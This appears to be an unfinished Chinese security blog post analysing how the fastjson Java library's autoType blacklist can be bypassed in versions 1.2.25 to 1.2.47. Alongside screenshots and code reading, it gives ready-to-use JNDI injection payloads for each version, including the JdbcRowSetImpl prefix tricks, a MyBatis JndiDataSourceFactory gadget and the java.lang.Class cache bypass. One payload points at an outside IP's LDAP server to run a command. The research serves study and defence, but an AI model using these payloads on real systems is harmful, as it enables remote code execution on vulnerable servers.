---
layout: post
date: 2025-5-8
title: "fastjson各版本绕过分析-(未完)"
author: "XinYiSleep"
category: Java
---
<h1 id="YdP3x">1.基本信息</h1>

```
之前我们讲了1.2.24的利用，但是在1.2.25版本开始引入了一个修复这个修复大体一直延续到最新版，
autoTypeSupport这个属性默认是false,会进行黑名单和白名单的检测，说到这里有点懵不要紧，我们先对比一下1.2.24和1.2.25的修复区别是什么(图一，图二)。
```
![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/1.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/2.png)

```
1.2.24中是直接loadClass了，但是在1.25中以及之后执行了checkAutoType(代码一)，
其实这段代码很恶心哈，因为没有else很难知道他像到底干什么(可能人家就是不想让你读懂)。
```
```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
    if (typeName == null) {
        return null;
    } else {
        String className = typeName.replace('$', '.');
        if (this.autoTypeSupport || expectClass != null) {
            int i;
            String deny;
            for(i = 0; i < this.acceptList.length; ++i) {
                deny = this.acceptList[i];
                if (className.startsWith(deny)) {
                    return TypeUtils.loadClass(typeName, this.defaultClassLoader);
                }
            }

            for(i = 0; i < this.denyList.length; ++i) {
                deny = this.denyList[i];
                if (className.startsWith(deny)) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
        }

        Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
        if (clazz == null) {
            clazz = this.deserializers.findClass(typeName);
        }

        if (clazz != null) {
            if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            } else {
                return clazz;
            }
        } else {
            //黑名单匹配到直接报错了
            if (!this.autoTypeSupport) {
                String accept;
                int i;
                for(i = 0; i < this.denyList.length; ++i) {
                    accept = this.denyList[i];
                    if (className.startsWith(accept)) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                }
                //白名单
                for(i = 0; i < this.acceptList.length; ++i) {
                    accept = this.acceptList[i];
                    if (className.startsWith(accept)) {
                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
                        if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                        }

                        return clazz;
                    }
                }
            }

            if (this.autoTypeSupport || expectClass != null) {
                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
            }

            if (clazz != null) {
                if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {
                    throw new JSONException("autoType is not support. " + typeName);
                }

                if (expectClass != null) {
                    if (expectClass.isAssignableFrom(clazz)) {
                        return clazz;
                    }

                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
            }

            if (!this.autoTypeSupport) {
                throw new JSONException("autoType is not support. " + typeName);
            } else {
                return clazz;
            }
        }
    }
}
```
<h1 id="XiOxB">2.各个版本绕过分析</h1>

<h3 id="MyfCH">2.1：需要开启autoTypeSupport</h3>
<h4 id="ymQNL">1.2.25 -1.2.41绕过</h4>
```
上面知道了默认是false,但是如果是true的话是可以执行到loadClass,这里我们设置为true，如果设置这个属性呢？
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
静态代码块进行了实例，那么直接执行setAutoTypeSupport方法就可了。
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/3.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/3.5.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/4.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/5.png)

```java

好那我们就直接用1.2.24的payload
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String A="{\"@type\":\"java.lang.NoSuchMethodExceptionl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"false\" }";
JSON.parseObject(A);
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/6.png)

```
咦，怎么报错了，这里其实有认真看上面代码一的话应该知道其实是有很名单的(图一，图二)，
那么应该怎么办呢？我们看图三我们知道上面设置autoTypeSupport这个属性true,所以可以直接进入，并且可以看到判断
前面是L后面是;就会截取中间的内容重新执行并且返回，就可以绕过了(代码一)。
```
![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/7.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/8.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/9.png)

```java

ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String A="{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"false\" }";
JSON.parseObject(A);
```
<h4 id="V8ERG">1.2.25-1.2.42绕过</h4>
```
在1.2.42开始黑名单采用hash进行比较(图一)，为什么这样呢？原因很简单就是不想让你读懂，不过没关系在github中已经有大佬爆破出来很多了项目地址 [https://github.com/LeadroyaL/fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)
,为了方式匹配我们把之前payload L ; 再写一遍就行了反正他会循环执行直到你前面会面没有 L ；为止(图二)，之后进入contextClassLoader.loadClass动态加载然后returm,最终payload(代码一)。
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/10.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/11.png)

```java

ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String A="{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"false\" }";
JSON.parseObject(A);
```
<h4 id="Cl9vb">1.2.25-1.2.43绕过</h4>
```
说起这个绕过，其实在上面进行分析的时候我截图中是有43这个版本绕过的代码的，其实很简单，之前我们1是前面L 后面；绕过，
但是上面还有一个分支(图一)，但是会出现一个问题会报错(图二)，但是这个报错其实是底层的报错主要就是告诉你格式有问题根据报错修改一下就ok了，
最终payload代码一
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/12.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/13.png)

```java

ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//逗号前面多了[{
String A="{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"false\" }";
JSON.parseObject(J);
```

<h4 id="z8AMQ">1.2.25-1.2.45绕过</h4>
```
org.apache.ibatis.datasource.jndi.JndiDataSourceFactory
这个类是Mybatis里面的所以先要maven
**version：3.x.x系列<3.5.0的版本**
<dependency>
    <groupId>org.mybatis</groupId>
    <artifactId>mybatis</artifactId>
    <version>3.4.6</version>
</dependency>
```

```
这里就很有意思了，我们之前的打法是从代码中绕过，而45中不需要绕过，或者说不算绕过因为在45中黑名单是没有org.apache.ibatis.datasource.jndi.JndiDataSourceFactory，在46中加上了他，所以我们知道这个类是有问题的，再说一句废话我们知道会执行Setter所以找Setter,在setProperties中我们找到了感兴趣的点（图一），这不就是JNDI注入吗？没错是的，只需要键是data_source就能执行到最下面的lookup,首先得确实
Properties是不是一个泛型，当然他肯定是的(图二)，并且是Object,那就爽歪歪了，所以最终payload代码一，这里可以简单思考一下是不是在图一中我们可以走到第一个lookup呢？答案是当然可以代码二。
```

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/14.png)

![](https://xinyisleep.github.io/img/2025/fastjson/fastjson1.2.25/15.png)

```java

String payload ="{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\"
,\"properties\":{\"data_source\":\"ldap://localhost:1234/Exploit\"}}";
JSON.parseObject(payload);
```
```java
String payload ="{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",
\"properties\":{\"data_source\":\"11111111111111111\",\"initial_context\":\"ldap://134.122.16.0:1389/TomcatBypass/Command/dir\"}}";
JSON.parseObject(payload);
```
<h4 id="QJM6t"></h4>
<h3 id="pn5nv">2.2：无需开启autoTypeSupport</h3>
<h4 id="Qd1NN">1.2.25-1.2.47绕过</h4>
```
这个就有点难理解了，建议自己跟着走一遍。
1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；
1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；
```

```java

String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
        + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
        + "\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}}";
JSON.parseObject(payload);
```

